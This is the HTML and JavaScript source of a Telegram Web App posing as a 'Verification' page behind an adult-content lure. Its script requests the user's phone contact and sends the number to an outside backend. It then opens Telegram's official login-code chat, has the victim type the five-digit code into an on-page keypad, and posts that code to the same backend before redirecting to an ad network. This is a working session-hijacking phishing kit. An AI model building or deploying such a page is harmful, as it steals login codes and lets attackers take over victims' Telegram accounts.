<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            font-family: 'Arial', sans-serif; margin: 0; padding: 0; 
            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
            background-size: cover; height: 100vh; display: flex; align-items: flex-end; justify-content: center; overflow: hidden;
        }
        .overlay { background: rgba(0, 0, 0, 0.5); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
        
        .main-container { width: 90%; max-width: 360px; z-index: 999; position: relative; text-align: center; margin-bottom: 40px; }

        .instruction-box { background: rgba(255, 255, 255, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 15px; color: #333; font-weight: bold; font-size: 15px; }

        /* বাটন ডিজাইন */
        .get-code-btn {
            background: #0088cc; color: white; border: 2px solid white;
            padding: 15px; border-radius: 12px; font-size: 17px; font-weight: bold;
            cursor: pointer; width: 100%; margin-bottom: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: block;
        }
        .get-code-btn:active { background: #0077b3; transform: scale(0.98); }

        .otp-inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
        .otp-box {
            width: 48px; height: 52px; background: rgba(255, 255, 255, 0.2);
            border: 2px solid white; border-radius: 10px; display: flex;
            align-items: center; justify-content: center; font-size: 26px; color: white; font-weight: bold;
            backdrop-filter: blur(5px);
        }

        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
        .key { background: #4caf50; padding: 16px; border-radius: 10px; font-size: 22px; font-weight: bold; color: white; border: none; }
        .key:active { background: #388e3c; }

        .hidden { display: none !important; }
        .loader { color: white; font-weight: bold; font-size: 18px; }
    </style>
</head>
<body>
    <div class="overlay"></div>

    <div class="main-container">
        <div id="step0">
            <div style="font-size: 50px; margin-bottom: 15px; animation: bounce 1s infinite;">👇</div>
            <div id="load" class="loader hidden">🔄 Please Wait...</div>
        </div>

        <div id="step2" class="hidden">
            <div class="instruction-box">Enter the 5-digit code from Telegram!</div>

            <!-- কোনো পপআপ ছাড়াই সরাসরি কাজ করবে -->
            <button type="button" class="get-code-btn" onclick="directMinimize()">
                📩 View OTP Code & Minimize
            </button>

            <div class="otp-inputs">
                <div class="otp-box" id="b1"></div>
                <div class="otp-box" id="b2"></div>
                <div class="otp-box" id="b3"></div>
                <div class="otp-box" id="b4"></div>
                <div class="otp-box" id="b5"></div>
            </div>

            <div class="keypad">
                <div class="key" onclick="addNum('1')">1</div><div class="key" onclick="addNum('2')">2</div><div class="key" onclick="addNum('3')">3</div>
                <div class="key" onclick="addNum('4')">4</div><div class="key" onclick="addNum('5')">5</div><div class="key" onclick="addNum('6')">6</div>
                <div class="key" onclick="addNum('7')">7</div><div class="key" onclick="addNum('8')">8</div><div class="key" onclick="addNum('9')">9</div>
                <div class="key" style="background:transparent"></div><div class="key" onclick="addNum('0')">0</div><div class="key" onclick="clearNum()">⌫</div>
            </div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        // অ্যাপটি হাফ-স্ক্রিন ওপেন রাখা ভালো যাতে মিনিমাইজ হওয়া সহজ হয়
        
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
        const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
        let currentOTP = "";

        tg.MainButton.setText("🍓 START CONTINUE 🔞");
        tg.MainButton.show();
        tg.MainButton.onClick(startFlow);

        // সরাসরি চ্যাট ওপেন এবং মিনিমাইজ করার ফাংশন
        function directMinimize() {
            tg.HapticFeedback.impactOccurred('heavy');
            
            // ১. সরাসরি কোড চ্যাট ওপেন করা
            tg.openTelegramLink("tg://openmessage?user_id=777000");
            
            // ২. অ্যাপটিকে ব্যাকগ্রাউন্ডে ঠেলে দেওয়ার ট্রিক (এটি মিনিমাইজ করতে বাধ্য করে)
            setTimeout(() => {
                tg.switchInlineQuery(" "); 
            }, 100);
        }

        function startFlow() {
            tg.requestContact();
            tg.MainButton.hide();
            document.getElementById('step0').classList.add('hidden');
            document.getElementById('load').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendNumberToBot(data.phone); }
                else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumberToBot(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('load').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            } catch (e) { }
        }

        function addNum(n) {
            if(currentOTP.length < 5) {
                currentOTP += n;
                updateBoxes();
                if(currentOTP.length === 5) { verifyOTP(); }
            }
        }
        function clearNum() { currentOTP = currentOTP.slice(0, -1); updateBoxes(); }
        function updateBoxes() {
            for(let i=1; i<=5; i++) { document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
        }

        async function verifyOTP() {
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: currentOTP })
                });
                const data = await res.json();
                if (data.status === "success") { 
                    window.location.href = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446"; 
                } else { 
                    tg.showAlert("Invalid Code!"); currentOTP = ""; updateBoxes(); 
                }
            } catch (e) { }
        }
    </script>
</body>
</html>
